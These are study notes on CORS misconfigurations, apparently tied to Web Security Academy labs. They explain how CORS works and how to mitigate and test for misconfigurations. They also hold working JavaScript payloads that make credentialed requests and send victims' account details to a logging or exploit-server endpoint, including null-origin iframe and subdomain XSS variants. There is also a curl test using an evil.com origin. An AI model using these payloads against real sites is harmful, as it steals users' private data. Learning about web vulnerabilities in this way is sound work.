## 🔐 What is CORS?

**CORS (Cross-Origin Resource Sharing)** is a **security feature implemented by web browsers** to **restrict web pages** from making requests to a **different domain** than the one that served the web page, unless the target server explicitly allows it.

- Example: A web page from `https://example.com` cannot request data from `https://api.target.com` unless `api.target.com` explicitly allows it.
    

---

## 🔍 How CORS Works

1. **Browser makes a request to a different origin** (cross-origin).
    
2. **Preflight Request (OPTIONS)**: For non-simple requests (e.g., `PUT`, `DELETE`, custom headers), the browser first sends an `OPTIONS` request.
    
3. **Server responds with CORS headers**:
    
    - `Access-Control-Allow-Origin`
        
    - `Access-Control-Allow-Methods`
        
    - `Access-Control-Allow-Headers`
        
    - `Access-Control-Allow-Credentials` (if cookies or auth headers are involved)
        
4. If the response satisfies the browser’s CORS policy, the actual request proceeds.
    

---

## 💥 What is a CORS Vulnerability?

A **CORS vulnerability** occurs when a **server is misconfigured to allow requests from any origin or an untrusted origin**, thereby leaking sensitive information like user data, session tokens, etc., to attackers.

### Common Misconfigurations

| Misconfiguration                 | Description                                                                                  | Impact                                                           |
| -------------------------------- | -------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| `Access-Control-Allow-Origin: *` | Wildcard allows any domain                                                                   | **Severe** if used with `Access-Control-Allow-Credentials: true` |
| Reflecting Origin header         | Server sets `Access-Control-Allow-Origin` based on user-supplied `Origin` without validation | **Exploitable** if the attacker controls the origin              |
| Allowing `null` origin           | Browser uses `null` origin for local files, sandboxed iframes                                | Attackers can abuse local HTML files                             |
| Whitelisting subdomains loosely  | e.g., `*.example.com`                                                                        | Allows attacker-controlled subdomains                            |
| Allowing dangerous headers       | Overly permissive `Access-Control-Allow-Headers`                                             | Can enable unauthorized access                                   |

---

## ⚠️ CORS with Credentials

When the browser sends cookies or authorization headers in cross-origin requests:

- `Access-Control-Allow-Credentials: true` must be present.
    
- `Access-Control-Allow-Origin: *` **cannot** be used. Must be a specific origin.
    

> **Danger**: If a server sends both `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, it is **vulnerable**.

---

## 🧪 Exploiting CORS

If a site is vulnerable, an attacker can:

1. Host malicious JavaScript on their domain.
    
2. Lure a user (authenticated on the target) to visit the malicious site.
    
3. Use JavaScript (e.g., `fetch()` or `XMLHttpRequest`) to send authenticated requests to the target site.
    
4. Steal the response if CORS headers allow it.
    

javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>


---

## 🛡️ Mitigation Strategies

| Mitigation                       | Description                                                         |
| -------------------------------- | ------------------------------------------------------------------- |
| Strict origin checks             | Never reflect the `Origin` header. Validate it against a whitelist. |
| Do not use `*` with credentials  | If credentials are required, specify the exact origin.              |
| Avoid overly permissive headers  | Only allow required headers and methods.                            |
| Use server-side token validation | Protect sensitive APIs with CSRF tokens or auth tokens.             |
| Consider same-origin policy      | For highly sensitive data, avoid cross-origin access entirely.      |

---

## 🔧 Example of Secure CORS Header

http
`Access-Control-Allow-Origin: https://trusted.example.com Access-Control-Allow-Methods: GET, POST Access-Control-Allow-Headers: Content-Type Access-Control-Allow-Credentials: true`

---

## 🔎 Testing for CORS Vulnerabilities

### Tools:

- **curl**:
    
`curl -H "Origin: https://evil.com" -I https://target.com/api`

- **Burp Suite**:
    
    - Use the Repeater to test `Origin` manipulation.
        
- **Online Tools**:
    
    - CORS scanners like `CORStest`, `CORSy`, or automated tools like `Nikto`.
        

---
## Does CORS and sop protect against CSRF?

CORS and sop does not provide protection against cross-site request forgery (CSRF) attacks, this is a common misconception.

CORS is a controlled relaxation of the same-origin policy, so poorly configured CORS may actually increase the possibility of CSRF attacks or exacerbate their impact.

There are various ways to perform CSRF attacks without using CORS, including simple HTML forms and cross-domain resource includes.

## Payload

**normal cors**
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

**null cors**
**snabox** 
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a2700a304fd0ce981a13437004f009e.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>"></iframe>

**subdoamin xxs (wilcard)**



<script>
    document.location="https://stock.0a1500f6047ea3fd8096c6f500f1005b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

<script> 
